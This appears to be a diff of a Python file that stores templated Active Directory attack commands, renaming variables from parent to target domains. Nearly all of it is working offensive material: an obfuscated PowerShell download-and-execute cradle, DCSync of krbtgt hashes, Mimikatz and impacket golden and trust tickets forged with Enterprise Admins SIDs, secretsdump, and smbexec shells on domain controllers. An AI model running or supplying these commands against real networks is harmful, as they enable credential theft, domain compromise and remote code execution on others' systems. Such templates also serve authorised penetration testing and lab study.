@@ -37,17 +37,17 @@ command['Get-DomainTrust'] = {'windows': ''}
 command['Get-DomainTrust']['windows'] = '''# PowerView.ps1
 iex(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/PowerView.ps1);
 Get-DomainTrust -Domain {{domain}}
-Get-DomainTrust -Domain {{parent_domain}}'''
+Get-DomainTrust -Domain {{target_domain}}'''
 
 # Get-DomainSID
 command['Get-DomainSID'] = {'windows': '', 'linux': ''}
 command['Get-DomainSID']['windows'] = '''# PowerView.ps1
 iex(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/PowerView.ps1);
 Get-DomainSid -Domain {{domain}}
-Get-DomainSid -Domain {{parent_domain}}'''
+Get-DomainSid -Domain {{target_domain}}'''
 
 command['Get-DomainSID']['linux'] = '''impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
-impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{parent_dc_host}} 0'''
+impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{target_dc_host}} 0'''
 
 # PowerUpSQL.ps1
 command['PowerUpSQL'] = {'windows': ''}
@@ -237,7 +237,7 @@ export KRB5CCNAME=administrator.ccache
 
 # Try to access target
 impacket-mssqlclient -k {{hostname}}
-impacket-smbclient -k \\\\{{hostname}}\\c$
+impacket-smbclient -k {{hostname}}
 '''
 
 command['Constrained_Delegation_without_protocol_transition'] = {'linux': ''}
@@ -343,17 +343,17 @@ impacket-smbexec -k -no-pass '{{target_computer}}' -debug'''.replace('{{evil_com
 # to_parent_domain_using_krbtgt
 command['to_parent_domain_using_krbtgt'] = {'windows': '', 'linux': ''}
 command['to_parent_domain_using_krbtgt']['windows'] = '''# Enum - Get krbtgt hash
-lsadump::dcsync /domain:{{domain}} /user:{{domain_short}}\krbtgt
+lsadump::dcsync /domain:{{current_domain}} /user:{{current_domain}}\krbtgt
 
 # Enum - Get Doamin SID
-Get-DomainSID -Domain {{domain}}
-Get-DomainSID -Domain {{parent_domain}}
+Get-DomainSID -Domain {{current_domain}}
+Get-DomainSID -Domain {{target_domain}}
 
 # Golden ticket
-Mimikatz.exe "kerberos::golden /user:glodenuser /domain:{{domain}} /sid:{{domain_sid}} /krbtgt:{{krbtgt_nthash}} /sids:{{parent_sid}}-519 /ptt" "exit"
+Mimikatz.exe "kerberos::golden /user:glodenuser /domain:{{current_domain}} /sid:{{current_domain_sid}} /krbtgt:{{current_domain_krbtgt_nthash}} /sids:{{target_sid}}-519 /ptt" "exit"
 
 # Try to access target
-dir \\\\{{parent_domain}}\\c$
+dir \\\\{{target_domain}}\\c$
 '''
 
 
@@ -363,16 +363,16 @@ impacket-secretsdump -just-dc -hashes {{hashes}} {{domain}}/'{{username}}'@{{dc_
 
 # Enum - Get Domain SID
 impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
-impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{parent_dc_host}} 0
+impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{target_dc_host}} 0
 
 # Golden ticket
-impacket-ticketer -nthash {{nthash}} -domain-sid {{domain_sid}} -domain {{domain}}  -extra-sid {{extra_sid}} goldenuser
+impacket-ticketer -nthash {{current_domain_krbtgt_nthash}} -domain-sid {{current_domain_sid}} -domain {{current_domain}}  -extra-sid {{target_sid}}-519 goldenuser
 
 # Export ccache
 export KRB5CCNAME=goldenuser.ccache
 
 # Try to access smb on target
-impacket-smbclient -k -no-pass {{domain}}/goldenuser@{{parent_dc_host}} -debug 
+impacket-smbclient -k -no-pass {{current_domain}}/goldenuser@{{target_dc_host}} -debug 
 '''
 
 
@@ -380,32 +380,32 @@ impacket-smbclient -k -no-pass {{domain}}/goldenuser@{{parent_dc_host}} -debug
 command['to_parent_domain_using_trustkey'] = {'windows': '', 'linux': ''}
 command['to_parent_domain_using_trustkey']['windows'] = '''# Enum
 Get-DomainSid -Domain {{domain}}
-Get-DomainSid -Domain {{parent_domain}}
+Get-DomainSid -Domain {{target_domain}}
 
 # Enum - Choose one
 {{mimikatz}} "lsadump::trust /patch"
 {{mimikatz}} "lsadump::dcsync /domain:{{domain}} /user:{{trust_account}}" "exit"
 
 # Method 1: Mimikatz.exe + Rubeus.exe
-{{mimikatz}} "Kerberos::golden /user:Administrator /domain:{{domain}} /sid:{{domain_sid}} /sids:{{parent_sid}}-519 /rc4:{{trust_key}} /service:krbtgt /target:{{parent_domain}} /ticket:{{ticket}}" "exit"
-{{rubeus}} asktgs /ticket:{{ticket}} /service:cifs/{{parent_dc_host}} /dc:{{parent_dc_host}} /ptt
+{{mimikatz}} "Kerberos::golden /user:Administrator /domain:{{current_domain}} /sid:{{current_domain_sid}} /sids:{{target_domain_sid}}-519 /rc4:{{trust_key}} /service:krbtgt /target:{{target_domain}} /ticket:{{ticket}}" "exit"
+{{rubeus}} asktgs /ticket:{{ticket}} /service:cifs/{{target_dc_host}} /dc:{{target_dc_host}} /ptt
 
 # Method 2: Only use Rubeus.exe
-{{rubeus}} silver /user:administrator /domain:{{domain}} /service:krbtgt/{{parent_domain}} /sid:{{domain_sid}} /rc4:{{trust_key}} /sids:{{parent_sid}}-519 /outfile:{{ticket}} /nowrap
-{{rubeus}} asktgs /service:cifs/{{parent_dc_host}}  /dc:{{parent_dc_host}} /ptt /ticket:{{ticket}}
+{{rubeus}} silver /user:administrator /domain:{{current_domain}} /service:krbtgt/{{target_domain}} /sid:{{current_domain_sid}} /rc4:{{trust_key}} /sids:{{target_domain_sid}}-519 /outfile:{{ticket}} /nowrap
+{{rubeus}} asktgs /service:cifs/{{target_dc_host}}  /dc:{{target_dc_host}} /ptt /ticket:{{ticket}}
 '''
 
 command['to_parent_domain_using_trustkey']['linux'] = '''# Enum
-impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
-impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{parent_dc_host}} 0
+impacket-lookupsid -domain-sids {{current_domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
+impacket-lookupsid -domain-sids {{current_domain}}/'{{username}}':'{{password}}'@{{target_dc_host}} 0
 impacket-secretsdump -just-dc-user '{{trust_account}}' {{domain}}/'{{username}}':'{{password}}'@{{dc_host}}
 
 # Make the ticket
-impacket-ticketer -nthash {{trust_key}} -domain-sid {{domain_sid}} -domain {{domain}} -extra-sid {{parent_sid}}-519 -spn krbtgt/{{parent_domain}} trustfakeuser
+impacket-ticketer -nthash {{trust_key}} -domain-sid {{current_domain_sid}} -domain {{current_domain}} -extra-sid {{target_domain_sid}}-519 -spn krbtgt/{{target_domain}} trustfakeuser
 export KRB5CCNAME=trustfakeuser.ccache
-impacket-getST -k -no-pass -spn cifs/{{parent_dc_host}} {{parent_domain}}/trustfakeuser@{{parent_domain}} -debug
-export KRB5CCNAME=trustfakeuser@{{parent_domain}}.ccache
-impacket-smbexec -k -no-pass {{parent_dc_host}}
+impacket-getST -k -no-pass -spn cifs/{{target_dc_host}} {{target_domain}}/trustfakeuser@{{target_domain}} -debug
+export KRB5CCNAME=trustfakeuser@{{target_domain}}.ccache
+impacket-smbexec -k -no-pass {{target_dc_host}}
 '''
 
 # Cross Forest using Extra SID
@@ -415,19 +415,19 @@ Get-DomainTrust -Domain {{forest_domain}}
 
 # [Skip if you are root domain adminitrator] Get Domain SID
 Get-DomainSid -Domain {{domain}}
-Get-DomainSid -Domain {{parent_domain}}
+Get-DomainSid -Domain {{target_domain}}
 
 # 如果現在在 subdomain，要先取得 root domain 的 krbtgt hash
-{{mimikatz}} "kerberos::golden /user:nouser /domain:{{domain}} /sid:{{domain_sid}} /sids:{{parent_sid}}-519 /krbtgt:{{nthash}} /ptt" "exit"
+{{mimikatz}} "kerberos::golden /user:nouser /domain:{{domain}} /sid:{{domain_sid}} /sids:{{target_domain_sid}}-519 /krbtgt:{{nthash}} /ptt" "exit"
 
 # Dump krbtgt NTLM hash in root domain
-{{mimikatz}} "lsadump::dcsync /domain:{{parent_domain}} /user:{{parent_domain_short}}\krbtgt" "exit"
+{{mimikatz}} "lsadump::dcsync /domain:{{target_domain}} /user:{{target_domain}}\krbtgt" "exit"
 
 # Check trust (Choose RID >= 1000 in output as forest_extra_sid)
 Get-DomainGroupMember -Identity "Administrators" -Domain {{forest_domain}}
 
 # Golden ticket for root domain Enterprise Admins
-{{mimikatz}} "kerberos::golden /user:h4x /domain:{{parent_domain}} /sid:{{parent_sid}} /krbtgt:{{parent_krbtgt_nthash}} /sids:{{forest_extra_sid}} /ptt" "exit"
+{{mimikatz}} "kerberos::golden /user:h4x /domain:{{target_domain}} /sid:{{target_domain_sid}} /krbtgt:{{target_domain_krbtgt_nthash}} /sids:{{forest_extra_sid}} /ptt" "exit"
 
 # Enjoy yourself
 dir \\\\{{forest_dc_host}}\c$
